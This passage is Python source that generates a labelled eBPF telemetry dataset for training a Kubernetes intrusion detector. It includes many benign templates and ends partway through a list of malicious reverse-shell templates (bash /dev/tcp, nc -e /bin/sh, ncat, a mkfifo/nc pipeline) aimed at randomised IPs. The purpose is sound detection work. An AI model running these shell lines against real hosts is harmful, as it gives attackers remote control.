"""Generate the labelled runtime-telemetry dataset (ml/training_data.csv).

Every row is one kernel event exactly as the eBPF sensor reports it after
Kubernetes enrichment (event type, process, parent, path, argv, flags,
destination, namespace) plus the behavioural window counters the agent
computes for the workload.  Rows are produced from 52 template families
(29 benign, 23 attack; ~300 concrete command/event variants) with randomised
IPs, ports, file names, users and namespaces.

Edge cases are first-class: many templates are *benign but look
malicious* (runc, `nc -z` wait-for loops, /dev/tcp port checks, go builds in
/tmp, CoreDNS reading its service-account token, postgres writing /dev/shm,
CSI drivers mounting block devices, strace in dev pods ...) or *malicious but
look benign* (reverse shells on 443, miners masquerading as nginx/kworker,
base64-obfuscated payloads, fileless memfd execution, slow-and-low attacks).
They are flagged with ``is_edge_case=1`` so the evaluation can report on them
separately.

The 17 command patterns of the original v0 dataset are kept as templates
(``orig_*``).

Usage:  python ml/generate_dataset.py [--benign 30000] [--malicious 10000] [--seed 7]
"""
from __future__ import annotations

import argparse
import base64
import csv
import os
import random
import string
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "services", "ebpf-agent"))
from ids_agent.features import truncate_cmdline  # noqa: E402

COLUMNS = ["event_type", "comm", "parent_comm", "uid", "path", "cmdline", "argc", "flags", "arg2",
           "dport", "daddr", "namespace", "win_exec_count", "win_distinct_bins", "win_connect_count",
           "win_distinct_dst", "win_sensitive_opens", "win_shell_count", "win_new_binary",
           "is_malicious", "attack_category", "mitre_technique", "template", "is_edge_case"]

APP_NS = ["default", "shop", "payments", "web", "api", "staging", "prod", "backend", "frontend",
          "orders", "auth", "analytics", "dev"]
PLATFORM_NS = ["kube-system", "kubernetes-dashboard", "local-path-storage", "ingress-nginx", "monitoring"]
CI_NS = ["ci", "argocd", "gitlab-runner", "jenkins", "flux-system"]

O_RDONLY_CLOEXEC = 0o2000000
O_WR = 0o1 | 0o100 | 0o1000
O_APPEND_W = 0o1 | 0o2000
CLONE_NEWNS, CLONE_NEWUTS, CLONE_NEWIPC = 0x20000, 0x4000000, 0x8000000
CLONE_NEWUSER, CLONE_NEWPID, CLONE_NEWNET, CLONE_NEWCGROUP = 0x10000000, 0x20000000, 0x40000000, 0x2000000

R = random.Random()


# ----------------------------------------------------------------------------- random helpers
def pick(seq):
    return R.choice(seq)


def priv_ip():
    return pick([f"10.{R.randint(0, 255)}.{R.randint(0, 255)}.{R.randint(1, 254)}",
                 f"10.244.0.{R.randint(2, 254)}",
                 f"172.{R.randint(16, 31)}.{R.randint(0, 255)}.{R.randint(1, 254)}",
                 f"192.168.{R.randint(0, 255)}.{R.randint(1, 254)}"])


def pub_ip():
    return f"{pick([23, 31, 45, 52, 64, 78, 91, 103, 128, 139, 146, 159, 185, 193, 203, 212])}." \
           f"{R.randint(0, 255)}.{R.randint(0, 255)}.{R.randint(1, 254)}"


def any_ip():
    return pub_ip() if R.random() < 0.7 else priv_ip()


def sus_port():
    return pick([4444, 4445, 1337, 31337, 5555, 6666, 7777, 9001, 1234, 12345, 4242, 8888, 9999, 2222])


def rev_port():
    """Reverse shells: mostly classic ports, sometimes 443/80/53 to blend in (edge)."""
    return pick([4444, 4444, 1337, 9001, 5555, 31337, 8443, 443, 80, 53, R.randint(1025, 65000)])


def word(n=None):
    return "".join(R.choices(string.ascii_lowercase, k=n or R.randint(3, 8)))


def hexs(n=8):
    return "".join(R.choices("0123456789abcdef", k=n))


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def wallet():
    return "4" + "".join(R.choices(string.ascii_letters + string.digits, k=94))


def evil_domain():
    return f"{word(5)}{R.randint(1, 99)}.{pick(['top', 'xyz', 'ru', 'cn', 'tk', 'pw', 'cc'])}"


def jwt():
    part = lambda n: "".join(R.choices(string.ascii_letters + string.digits + "-_", k=n))  # noqa: E731
    return f"eyJhbGciOiJSUzI1NiIsImtpZCI6{part(20)}.{part(60)}.{part(40)}"


def app_uid():
    return pick([0, 0, 0, 1000, 1001, 101, 999, 65532, 33, 70])


# ----------------------------------------------------------------------------- event builders
def exe(path, argv, parent, uid=None, ns=None):
    argv = truncate_cmdline(argv)
    return dict(event_type="exec", comm=os.path.basename(path)[:15], parent_comm=parent[:15],
                uid=app_uid() if uid is None else uid, path=path, cmdline=" ".join(argv), argc=len(argv),
                flags=0, arg2=0, dport=0, daddr="", namespace=ns or pick(APP_NS))


def sh_c(cmd, parent, shell="/bin/sh", uid=None, ns=None):
    return exe(shell, [os.path.basename(shell), "-c", cmd], parent, uid, ns)


def opn(comm, path, parent, flags=O_RDONLY_CLOEXEC, uid=None, ns=None):
    return dict(event_type="open", comm=comm[:15], parent_comm=parent[:15],
                uid=app_uid() if uid is None else uid, path=path, cmdline="", argc=0, flags=flags,
                arg2=0, dport=0, daddr="", namespace=ns or pick(APP_NS))


def conn(comm, daddr, dport, parent, uid=None, ns=None):
    return dict(event_type="connect", comm=comm[:15], parent_comm=parent[:15],
                uid=app_uid() if uid is None else uid, path="", cmdline="", argc=0, flags=0, arg2=0,
                dport=dport, daddr=daddr, namespace=ns or pick(APP_NS))


def unix(comm, path, parent, uid=None, ns=None):
    return dict(event_type="connect", comm=comm[:15], parent_comm=parent[:15],
                uid=app_uid() if uid is None else uid, path=path, cmdline="", argc=0, flags=0, arg2=0,
                dport=0, daddr="", namespace=ns or pick(APP_NS))


def sysc(etype, comm, parent, flags=0, arg2=0, path="", cmdline="", argc=0, uid=None, ns=None):
    return dict(event_type=etype, comm=comm[:15], parent_comm=parent[:15],
                uid=app_uid() if uid is None else uid, path=path, cmdline=cmdline, argc=argc,
                flags=flags, arg2=arg2, dport=0, daddr="", namespace=ns or pick(APP_NS))


# ----------------------------------------------------------------------------- template registry
BENIGN, MALICIOUS = [], []


def tpl(label, category, mitre="", weight=1.0, profile="steady", edge=False):
    def deco(fn):
        (MALICIOUS if label else BENIGN).append(
            dict(name=fn.__name__, fn=fn, label=label, category=category, mitre=mitre,
                 weight=weight, profile=profile, edge=edge))
        return fn
    return deco


RUNTIME_PARENTS = ["runc", "runc:[2:INIT]", "containerd-shim", "containerd-shim-runc-v2"]
SHELL_PARENTS = ["sh", "bash", "dash"]
WEB_PARENTS = ["java", "nginx", "node", "php-fpm", "gunicorn", "httpd", "uwsgi", "tomcat", "puma"]


# ============================================================================ BENIGN
# ---- the original v0 normal commands
@tpl(0, "benign", weight=4)
def orig_normal():
    parent, cmd = pick([("bash", "/usr/bin/ls -la /var/log"), ("bash", "/usr/bin/cat /etc/hosts"),
                        ("bash", "/usr/bin/grep 'error' /var/log/syslog | wc -l"),
                        ("cron", "/usr/sbin/logrotate /etc/logrotate.conf"),
                        ("systemd", "/usr/lib/systemd/systemd-journald"), ("dockerd", "/usr/bin/docker ps"),
                        ("python3", "/usr/bin/python3 app.py"), ("sh", "/bin/sh -c date"),
                        ("nginx", "/usr/sbin/nginx -g daemon off;"),
                        ("postgres", "/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data")])
    argv = cmd.split(" ")
    e = exe(argv[0], [os.path.basename(argv[0])] + argv[1:], parent)
    if parent == "dockerd":
        e["namespace"] = pick(CI_NS)
    return e


@tpl(0, "benign", weight=6, profile="startup")
def app_start():
    opts = [("/usr/bin/java", ["java", f"-Xms{pick([128, 256, 512])}m", f"-Xmx{pick([512, 1024, 2048])}m", "-jar",
                                "/app/app.jar", f"--spring.profiles.active={pick(['prod', 'staging'])}"]),
            ("/usr/local/bin/node", ["node", pick(["/app/server.js", "dist/main.js", "/usr/src/app/index.js"])]),
            ("/usr/local/bin/python3", ["python3", "/app/manage.py", "runserver", "0.0.0.0:8000"]),
            ("/usr/local/bin/gunicorn", ["gunicorn", "-w", str(R.randint(2, 8)), "-b", "0.0.0.0:8000", "app:app"]),
            ("/usr/local/bin/uvicorn", ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8080"]),
            ("/usr/sbin/nginx", ["nginx", "-g", "daemon off;"]),
            ("/usr/local/bin/redis-server", ["redis-server", "/usr/local/etc/redis/redis.conf"]),
            ("/usr/bin/mongod", ["mongod", "--bind_ip_all", "--wiredTigerCacheSizeGB", "0.25"]),
            ("/usr/local/bin/docker-entrypoint.sh", ["docker-entrypoint.sh", "postgres"]),
            ("/app/bin/server", ["/app/bin/server", "--config", "/etc/app/config.yaml"]),
            ("/usr/local/bin/envoy", ["envoy", "-c", "/etc/envoy/envoy.yaml"]),
            ("/coredns", ["/coredns", "-conf", "/etc/coredns/Corefile"])]
    path, argv = pick(opts)
    ns = pick(PLATFORM_NS) if "coredns" in path else None
    return exe(path, argv, pick(RUNTIME_PARENTS + ["sh", "tini", "dumb-init"]), ns=ns)


@tpl(0, "benign", weight=5, profile="startup", edge=True)
def entrypoint_script():
    cmds = [("/usr/bin/envsubst", ["envsubst", "<", "/etc/nginx/templates/default.conf.template"]),
            ("/bin/sed", ["sed", "-i", f"s/LISTEN_PORT/{pick([80, 8080])}/", "/etc/nginx/conf.d/default.conf"]),
            ("/bin/mkdir", ["mkdir", "-p", "/var/cache/nginx", "/run/app"]),
            ("/bin/chown", ["chown", "-R", "app:app", "/data"]),
            ("/usr/bin/id", ["id", "-u"]), ("/usr/bin/whoami", ["whoami"]),
            ("/bin/hostname", ["hostname"]), ("/bin/cat", ["cat", "/etc/hostname"]),
            ("/bin/uname", ["uname", "-m"]), ("/usr/bin/getent", ["getent", "passwd", "app"]),
            ("/usr/bin/find", ["find", "/docker-entrypoint.d/", "-mindepth", "1", "-maxdepth", "1", "-type", "f"]),
            ("/bin/ls", ["ls", "/docker-entrypoint-initdb.d/"]),
            ("/usr/bin/env", ["env"]), ("/usr/bin/printenv", ["printenv", "APP_ENV"]),
            ("/usr/bin/sort", ["sort", "-V"]), ("/bin/sleep", ["sleep", str(R.randint(1, 10))]),
            ("/usr/local/bin/gosu", ["gosu", "postgres", "postgres"]),
            ("/sbin/su-exec", ["su-exec", "redis", "redis-server"])]
    path, argv = pick(cmds)
    return exe(path, argv, pick(["sh", "bash", "docker-entrypoi", "entrypoint.sh"]))


@tpl(0, "benign", weight=7, edge=True)
def health_probe():
    port = pick([80, 8080, 8000, 3000, 9090])
    opts = [sh_c(f"curl -fs http://localhost:{port}/healthz || exit 1", pick(RUNTIME_PARENTS)),
            exe("/usr/bin/curl", ["curl", "-fsS", f"http://127.0.0.1:{port}/{pick(['health', 'ready', 'live'])}"],
                pick(RUNTIME_PARENTS + ["sh"])),
            exe("/usr/bin/wget", ["wget", "-q", "--spider", f"http://127.0.0.1:{port}/"], pick(RUNTIME_PARENTS)),
            exe("/usr/local/bin/redis-cli", ["redis-cli", "ping"], pick(RUNTIME_PARENTS)),
            exe("/usr/bin/pg_isready", ["pg_isready", "-U", "postgres", "-h", "127.0.0.1"], pick(RUNTIME_PARENTS)),
            exe("/usr/bin/mysqladmin", ["mysqladmin", "ping", "-h", "localhost"], pick(RUNTIME_PARENTS)),
            exe("/bin/cat", ["cat", "/tmp/healthy"], pick(RUNTIME_PARENTS)),
            exe("/bin/grpc_health_probe", ["grpc_health_probe", "-addr=:50051"], pick(RUNTIME_PARENTS)),
            exe("/usr/bin/mongosh", ["mongosh", "--quiet", "--eval", "db.adminCommand('ping')"], pick(RUNTIME_PARENTS)),
            exe("/bin/true", ["true"], pick(RUNTIME_PARENTS))]
    return pick(opts)


@tpl(0, "benign", weight=4, profile="startup", edge=True)
def wait_for_dependency():
    host, port = pick([("postgres", 5432), ("db", 5432), ("redis", 6379), ("mysql", 3306), ("kafka", 9092),
                       ("rabbitmq", 5672), ("mongo", 27017), ("elasticsearch", 9200)])
    opts = [sh_c(f"until nc -z {host} {port}; do echo waiting for {host}; sleep 2; done", "sh"),
            exe("/usr/bin/nc", ["nc", "-z", "-w", "2", host, str(port)], pick(["sh", "bash", "wait-for-it.sh"])),
            exe("/bin/busybox", ["busybox", "nc", "-z", host, str(port)], "sh"),
            exe("/bin/bash", ["bash", "-c", f"cat < /dev/null > /dev/tcp/{host}/{port}"], "timeout"),
            exe("/bin/bash", ["timeout", "1", "bash", "-c", f"</dev/tcp/{host}/{port}"][2:], "timeout"),
            sh_c(f"while ! nc -z {host} {port}; do sleep 1; done", "sh"),
            conn("nc", priv_ip(), port, "sh")]
    return pick(opts)


@tpl(0, "benign", weight=6, profile="burst_ci")
def package_and_build():
    ns = pick(CI_NS + APP_NS[:3])
    d = f"go-build{R.randint(100000, 999999999)}"
    opts = [exe("/usr/bin/apt-get", ["apt-get", "update"], "sh"),
            exe("/usr/bin/apt-get", ["apt-get", "install", "-y", "--no-install-recommends", pick(
                ["curl", "ca-certificates", "git", "build-essential", "libpq-dev"])], "sh"),
            exe("/usr/local/bin/pip", ["pip", "install", "--no-cache-dir", "-r", "requirements.txt"], "sh"),
            exe("/usr/local/bin/npm", ["npm", "ci", "--omit=dev"], "sh"),
            exe("/sbin/apk", ["apk", "add", "--no-cache", pick(["git", "curl", "openssl", "tzdata"])], "sh"),
            exe("/usr/bin/dpkg", ["dpkg", "-i", f"/tmp/{word()}.deb"], "apt-get"),
            exe("/usr/local/go/bin/go", ["go", "build", "-o", f"/tmp/{d}/app", "./cmd/server"], "sh"),
            exe(f"/tmp/{d}/b001/exe/main", ["main"], "go"),
            exe("/usr/lib/gcc/x86_64-linux-gnu/12/cc1", ["cc1", "-quiet", "main.c", "-o", f"/tmp/cc{word(6)}.s"], "gcc"),
            exe("/usr/bin/gcc", ["gcc", "-O2", "-c", "-o", f"/tmp/cc{word(6)}.o", "main.c"], "make"),
            exe("/usr/bin/make", ["make", f"-j{R.randint(2, 8)}"], "sh"),
            exe("/usr/bin/mvn", ["mvn", "-B", "-q", "package", "-DskipTests"], "sh"),
            exe("/usr/bin/git", ["git", "fetch", "--depth", "1", "origin", f"{hexs(40)}"], "sh"),
            exe("/usr/local/bin/cargo", ["cargo", "build", "--release"], "sh"),
            exe("/usr/bin/tar", ["tar", "xzf", f"/tmp/{word()}.tar.gz", "-C", "/usr/local/bin"], "sh")]
    e = pick(opts)
    e["namespace"] = ns
    return e


@tpl(0, "benign", weight=3, profile="burst_ci", edge=True)
def legit_download():
    v = f"v{R.randint(1, 3)}.{R.randint(0, 30)}.{R.randint(0, 9)}"
    opts = [exe("/usr/bin/curl", ["curl", "-fsSLo", "/usr/local/bin/kubectl",
                                  f"https://dl.k8s.io/release/{v}/bin/linux/amd64/kubectl"], "sh"),
            exe("/usr/bin/wget", ["wget", "-q", f"https://github.com/{word()}/{word()}/releases/download/{v}/tool.tar.gz",
                                  "-O", "/tmp/tool.tar.gz"], "sh"),
            exe("/usr/bin/curl", ["curl", "-sSL", "-o", "/tmp/helm.tgz", f"https://get.helm.sh/helm-{v}-linux-amd64.tar.gz"], "sh"),
            exe("/usr/bin/git", ["git", "clone", "--depth", "1", f"https://github.com/{word()}/{word()}.git"], "sh"),
            exe("/usr/bin/curl", ["curl", "-s", "https://api.stripe.com/v1/charges", "-u", "$STRIPE_API_KEY:"], "python3"),
            exe("/usr/bin/sha256sum", ["sha256sum", "-c", "tool.tar.gz.sha256"], "sh"),
            exe("/bin/chmod", ["chmod", "+x", "/usr/local/bin/kubectl"], "sh"),
            exe("/usr/bin/aws", ["aws", "s3", "cp", f"/backup/{word()}.dump", f"s3://{word()}-backups/"], "sh")]
    e = pick(opts)
    e["namespace"] = pick(CI_NS + APP_NS)
    return e


@tpl(0, "benign", weight=3, profile="burst_ci", edge=True)
def ci_kubectl():
    opts = [["kubectl", "apply", "-f", "k8s/deployment.yaml"], ["kubectl", "rollout", "status", f"deployment/{word()}"],
            ["kubectl", "get", "pods", "-n", pick(APP_NS)], ["helm", "upgrade", "--install", word(), "./chart"],
            ["kubectl", "set", "image", f"deployment/{word()}", f"app=registry.local/{word()}:{hexs(7)}"],
            ["argocd", "app", "sync", word()]]
    argv = pick(opts)
    return exe(f"/usr/local/bin/{argv[0]}", argv, pick(["sh", "bash", "argocd-repo-se"]), ns=pick(CI_NS))


@tpl(0, "benign", weight=4)
def batch_job():
    opts = [exe("/usr/local/bin/python3", ["python3", "/app/jobs/cleanup.py", "--days", str(R.randint(7, 90))], "sh"),
            exe("/usr/bin/pg_dump", ["pg_dump", "-h", "db", "-U", "app", "-Fc", "appdb", "-f", "/backup/appdb.dump"], "sh"),
            exe("/bin/tar", ["tar", "czf", f"/backup/data-{R.randint(1, 28)}.tgz", "/data"], "sh"),
            exe("/usr/bin/rsync", ["rsync", "-az", "/data/", f"backup.{pick(APP_NS)}.svc:/srv/backup/"], "sh"),
            exe("/usr/bin/find", ["find", "/var/log/app", "-name", "*.log", "-mtime", "+7", "-delete"], "sh"),
            exe("/usr/sbin/logrotate", ["logrotate", "/etc/logrotate.conf"], "cron"),
            exe("/bin/rm", ["rm", "-rf", f"/tmp/cache/{word()}"], "sh"), exe("/bin/gzip", ["gzip", "-9", "/backup/x.sql"], "sh"),
            exe("/bin/date", ["date", "+%s"], "sh"), exe("/bin/sleep", ["sleep", "3600"], "sh"),
            exe("/usr/bin/redis-cli", ["redis-cli", "-h", "redis", "BGSAVE"], "sh")]
    return pick(opts)


@tpl(0, "benign", weight=2, edge=True)
def benign_base64():
    opts = [sh_c(f"base64 -d /config/{word()}.b64 > /etc/ssl/certs/app.pem", "sh"),
            sh_c(f"echo {b64(word(20) + ':' + word(20))} | base64 -d > /app/config.json", "sh"),
            exe("/usr/bin/openssl", ["openssl", "base64", "-d", "-in", "/secrets/key.b64", "-out", "/tmp/key.pem"], "sh"),
            exe("/usr/bin/base64", ["base64", "-w0", f"/app/{word()}.png"], "python3")]
    return pick(opts)


@tpl(0, "benign", weight=3)
def benign_interpreter():
    opts = [exe("/usr/local/bin/python3", ["python3", "-c", "import sys; print(sys.version)"], "sh"),
            exe("/usr/local/bin/python3", ["python3", "-m", "pip", "--version"], "sh"),
            exe("/usr/local/bin/node", ["node", "-e", "console.log(process.version)"], "sh"),
            exe("/usr/bin/perl", ["perl", "-v"], "sh"),
            exe("/usr/local/bin/php", ["php", "artisan", "migrate", "--force"], "sh"),
            exe("/usr/local/bin/ruby", ["ruby", "bin/rails", "db:migrate"], "sh"),
            exe("/usr/local/bin/python3", ["python3", "-m", "alembic", "upgrade", "head"], "sh"),
            exe("/usr/bin/awk", ["awk", "-F:", "{print $1}", "/app/data.csv"], "sh")]
    return pick(opts)


@tpl(0, "benign", weight=2, edge=True)
def debug_session():
    ns = pick(["dev", "staging", "default"])
    opts = [["ps", "aux"], ["top", "-b", "-n", "1"], ["df", "-h"], ["free", "-m"], ["ls", "-la", "/app"],
            ["cat", "/app/config.yaml"], ["tail", "-n", "100", "/var/log/app/app.log"], ["netstat", "-tlnp"],
            ["ss", "-lntp"], ["curl", "-v", f"http://{word()}:8080/api/health"], ["dig", f"{word()}.default.svc.cluster.local"],
            ["env"], ["vi", "/app/.env"], ["ping", "-c", "1", word()], ["ip", "addr"], ["hostname", "-i"],
            ["nslookup", "kubernetes.default"]]
    argv = pick(opts)
    return exe(f"/usr/bin/{argv[0]}", argv, pick(["bash", "sh"]), ns=ns)


@tpl(0, "benign", weight=3, profile="startup", edge=True)
def container_runtime():
    opts = [exe("/pause", ["/pause"], "containerd-shim"),
            exe("/usr/bin/runc", ["runc", "init"], "runc"),
            exe("/usr/bin/containerd-shim-runc-v2", ["containerd-shim-runc-v2", "-namespace", "moby", "-id", hexs(64)],
                "containerd"),
            sysc("unshare", "runc:[1:CHILD]", "runc", flags=CLONE_NEWNS | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNET,
                 uid=0),
            sysc("setns", "runc:[2:INIT]", "runc", flags=pick([CLONE_NEWNS, CLONE_NEWNET, CLONE_NEWPID]), uid=0),
            sysc("mount", "runc:[2:INIT]", "runc", path=pick(["/proc", "/dev", "/sys", "/etc/hosts", "/dev/shm", "/dev/mqueue"]),
                 cmdline=pick(["proc proc", "tmpfs tmpfs", "sysfs sysfs", "/var/lib/docker/containers/x/hosts ",
                               "shm tmpfs", "mqueue mqueue"]), argc=2, uid=0),
            sysc("memfd", "runc", "containerd-shim", flags=3, path="runc_cloned:/proc/self/exe", uid=0),
            sysc("memfd", "runc:[1:CHILD]", "runc", flags=3, path="runc_cloned:/proc/self/exe", uid=0)]
    return pick(opts)


@tpl(0, "benign", weight=5, edge=True)
def k8s_component_token():
    comm = pick(["coredns", "kube-proxy", "storage-provisi", "dashboard", "metrics-sidecar", "controller",
                 "local-path-prov", "metrics-server", "prometheus", "fluent-bit"])
    f = pick(["token", "token", "ca.crt", "namespace"])
    return opn(comm, f"/var/run/secrets/kubernetes.io/serviceaccount/{f}", pick(RUNTIME_PARENTS),
               ns=pick(PLATFORM_NS), uid=pick([0, 65532, 65534]))


@tpl(0, "benign", weight=2, edge=True)
def platform_app_token():
    comm = pick(["argocd-applicat", "python3", "java", "node", "gitlab-runner", "flux", "kubectl", "helm"])
    return opn(comm, "/var/run/secrets/kubernetes.io/serviceaccount/token", pick(RUNTIME_PARENTS + ["sh"]),
               ns=pick(CI_NS))


@tpl(0, "benign", weight=3, edge=True)
def control_plane_pki():
    comm = pick(["kube-apiserver", "etcd", "kube-controller", "kube-scheduler"])
    path = pick(["/etc/kubernetes/pki/ca.crt", "/etc/kubernetes/pki/apiserver.key", "/etc/kubernetes/scheduler.conf",
                 "/etc/kubernetes/controller-manager.conf", "/etc/kubernetes/pki/etcd/server.key",
                 "/etc/kubernetes/pki/sa.pub"])
    return opn(comm, path, "containerd-shim", ns="kube-system", uid=0)


@tpl(0, "benign", weight=1.5, edge=True)
def auth_shadow_access():
    comm = pick(["sshd", "unix_chkpwd", "sudo", "su", "passwd", "chpasswd", "login"])
    path = pick(["/etc/shadow", "/etc/shadow", "/etc/sudoers", "/etc/sudoers.d/90-users", "/etc/gshadow"])
    flags = O_WR if comm in ("passwd", "chpasswd") and path == "/etc/shadow" else O_RDONLY_CLOEXEC
    return opn(comm, path, pick(["sshd", "bash", "sh"]), flags=flags, uid=0, ns=pick(["bastion", "dev", "default"]))


@tpl(0, "benign", weight=1.5, profile="startup", edge=True)
def useradd_in_init():
    comm = pick(["useradd", "groupadd", "adduser", "addgroup", "usermod"])
    return opn(comm, pick(["/etc/passwd", "/etc/group", "/etc/shadow"]), pick(["sh", "bash"]), flags=O_WR, uid=0)


@tpl(0, "benign", weight=2, edge=True)
def misc_sensitive_benign():
    opts = [opn("postgres", f"/dev/shm/PostgreSQL.{R.randint(10000, 2 ** 31)}", "postgres", flags=0o2 | 0o100, uid=999),
            opn("chrome", f"/dev/shm/.org.chromium.Chromium.{word(6)}", "node", flags=0o2 | 0o100),
            opn("bash", pick(["/root/.bashrc", "/root/.profile", "/root/.bash_history"]),
                pick(RUNTIME_PARENTS), uid=0),
            opn("pip", f"/root/.cache/pip/http/{hexs(2)}/{hexs(40)}", "sh", flags=O_WR, uid=0),
            opn(pick(["java", "node", "python3"]), pick(["/proc/sys/kernel/random/boot_id", "/proc/sys/kernel/osrelease",
                                                         "/proc/sys/kernel/hostname", "/proc/sys/kernel/pid_max"]),
                pick(RUNTIME_PARENTS)),
            opn("ssh", pick(["/etc/ssh/ssh_config", "/root/.ssh/known_hosts", "/root/.ssh/config"]), "git", uid=0,
                ns=pick(CI_NS)),
            opn("cron", pick(["/etc/crontab", f"/etc/cron.d/{word()}", "/var/spool/cron/crontabs/root"]), "cron", uid=0),
            opn("nginx", "/etc/ssh/sshd_config", "sh", uid=0, ns="bastion")]
    return pick(opts)


@tpl(0, "benign", weight=9)
def app_network():
    comm = pick(["java", "node", "python3", "gunicorn", "uvicorn", "nginx", "envoy", "php-fpm", "ruby", "dotnet", "server"])
    opts = [conn(comm, priv_ip(), pick([5432, 3306, 6379, 27017, 9092, 5672, 9200, 8080, 80, 50051, 11211]),
                 pick(RUNTIME_PARENTS + ["sh"])),
            conn(comm, "10.96.0.10", 53, pick(RUNTIME_PARENTS)),
            conn(comm, pub_ip(), 443, pick(RUNTIME_PARENTS)),
            conn(comm, "127.0.0.1", pick([8080, 9000, 15000, 6379]), pick(RUNTIME_PARENTS)),
            conn(comm, priv_ip(), pick([30080, 31000, 32123]), pick(RUNTIME_PARENTS))]
    return pick(opts)


@tpl(0, "benign", weight=4, edge=True)
def platform_network():
    opts = [conn(pick(["coredns", "kube-proxy", "controller", "dashboard", "metrics-server", "storage-provisi"]),
                 pick(["10.96.0.1", "192.168.49.2"]), pick([443, 8443, 6443]), "containerd-shim", ns=pick(PLATFORM_NS)),
            conn("prometheus", priv_ip(), pick([9100, 8080, 10250, 9090, 10249]), "containerd-shim", ns="monitoring"),
            conn("coredns", pick(["8.8.8.8", "1.1.1.1", pub_ip()]), 53, "containerd-shim", ns="kube-system"),
            conn("etcd", "127.0.0.1", 2379, "containerd-shim", ns="kube-system", uid=0),
            conn("kube-apiserver", priv_ip(), 2379, "containerd-shim", ns="kube-system", uid=0),
            conn("kube-apiserver", priv_ip(), 10250, "containerd-shim", ns="kube-system", uid=0)]
    return pick(opts)


@tpl(0, "benign", weight=2, edge=True)
def benign_odd_ports():
    comm = pick(["python3", "node", "java", "celery", "minio"])
    port = pick([5555, 9001, 9999, 1234, 7777, 8888])  # flower, minio console, ...
    return conn(comm, priv_ip(), port, pick(RUNTIME_PARENTS))


@tpl(0, "benign", weight=1.5, edge=True)
def ci_git_ssh_docker():
    opts = [conn("ssh", pub_ip(), 22, "git", ns=pick(CI_NS)),
            unix("docker", "/var/run/docker.sock", "sh", ns=pick(CI_NS), uid=0),
            unix("dockerd", "/run/containerd/containerd.sock", "containerd-shim", ns=pick(CI_NS), uid=0),
            conn("git-remote-http", pub_ip(), 443, "git", ns=pick(CI_NS))]
    return pick(opts)


@tpl(0, "benign", weight=3, profile="startup", edge=True)
def drop_privileges():
    opts = [sysc("setuid", pick(["gosu", "su-exec", "setpriv", "nginx", "postgres", "redis-server", "httpd", "cron"]),
                 pick(["sh", "docker-entrypoi", "nginx", "containerd-shim"]), flags=pick([999, 1000, 101, 33, 70, 65532]), uid=0),
            sysc("setuid", "sudo", "bash", flags=0, uid=1000, ns="bastion"),
            sysc("setuid", "su", "bash", flags=0, uid=1000, ns=pick(["bastion", "dev"])),
            sysc("setuid", "cron", "cron", flags=0, uid=0)]
    return pick(opts)


@tpl(0, "benign", weight=2.5)
def benign_memfd():
    comm, name = pick([("java", "java"), ("node", "v8"), ("python3", "libffi"), ("chrome", "shared_memory"),
                       ("postgres", "memfd-cache"), ("server", "go-memfd"), ("envoy", "jemalloc")])
    return sysc("memfd", comm, pick(RUNTIME_PARENTS + ["sh"]), flags=pick([0, 1, 3]), path=name)


@tpl(0, "benign", weight=3, profile="burst_ci", edge=True)
def benign_chmod():
    opts = [sysc("chmod", "chmod", "sh", flags=0o755, path=pick(["/usr/local/bin/kubectl", "/usr/local/bin/helm",
                                                                    "/app/entrypoint.sh", "/usr/local/bin/tool"])),
            sysc("chmod", "node", "npm", flags=0o755, path=f"/app/node_modules/.bin/{word()}"),
            sysc("chmod", "python3", "pip", flags=0o755, path=f"/usr/local/bin/{word()}"),
            sysc("chmod", "go", "go", flags=0o755, path=f"/tmp/go-build{R.randint(10 ** 6, 10 ** 9)}/b001/exe/main"),
            sysc("chmod", "chmod", "sh", flags=0o2775, path="/var/www/html"),
            sysc("chmod", "initdb", "postgres", flags=0o700, path="/var/lib/postgresql/data", uid=999),
            sysc("chmod", "tar", "sh", flags=0o755, path=f"/usr/local/bin/{word()}")]
    e = pick(opts)
    e["namespace"] = pick(CI_NS + APP_NS)
    return e


@tpl(0, "benign", weight=1, edge=True)
def debugger_in_dev():
    comm = pick(["strace", "gdb", "py-spy", "dlv", "perf"])
    return sysc("ptrace", comm, "bash", flags=pick([16, 0x4206, 0, 24]), arg2=R.randint(1, 500), uid=0,
                ns=pick(["dev", "staging"]))


@tpl(0, "benign", weight=1, edge=True)
def csi_mount():
    dev = pick(["/dev/xvdf", "/dev/nvme1n1", "/dev/sdb", "/dev/vdb"])
    return sysc("mount", pick(["mount", "csi-node-driver", "ebs-plugin"]), pick(["csi-node-driver", "containerd-shim"]),
                path=f"/var/lib/kubelet/pods/{hexs(8)}/volumes/kubernetes.io~csi/pvc-{hexs(8)}/mount",
                cmdline=f"{dev} ext4", argc=2, uid=0, ns="kube-system")


@tpl(0, "benign", weight=1.5, edge=True)
def kube_proxy_iptables():
    argv = pick([["iptables-restore", "--noflush", "--counters"], ["iptables", "-w", "5", "-t", "nat", "-N", "KUBE-SERVICES"],
                 ["ip6tables-save", "-t", "nat"], ["conntrack", "-D", "-p", "udp"]])
    return exe(f"/usr/sbin/{argv[0]}", argv, "kube-proxy", uid=0, ns="kube-system")


# ============================================================================ MALICIOUS
REVERSE_SHELLS = [
    lambda ip, p: sh_c(f"bash -i >& /dev/tcp/{ip}/{p} 0>&1", pick(WEB_PARENTS + SHELL_PARENTS)),
    lambda ip, p: exe("/bin/bash", ["bash", "-c", f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"], pick(WEB_PARENTS + RUNTIME_PARENTS)),
    lambda ip, p: exe("/bin/sh", ["sh", "-i"], pick(["nc", "ncat", "socat", "python3", "perl"])),
    lambda ip, p: exe("/usr/bin/nc", ["nc", "-e", "/bin/sh", ip, str(p)], pick(SHELL_PARENTS + WEB_PARENTS)),
    lambda ip, p: exe("/usr/bin/ncat", ["ncat", ip, str(p), "-e", "/bin/bash"], pick(SHELL_PARENTS)),
    lambda ip, p: exe("/bin/nc", ["nc", ip, str(p), "-c", "sh"], pick(SHELL_PARENTS)),
    lambda ip, p: sh_c(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {p} >/tmp/f", pick(WEB_PARENTS + ["sh"])),
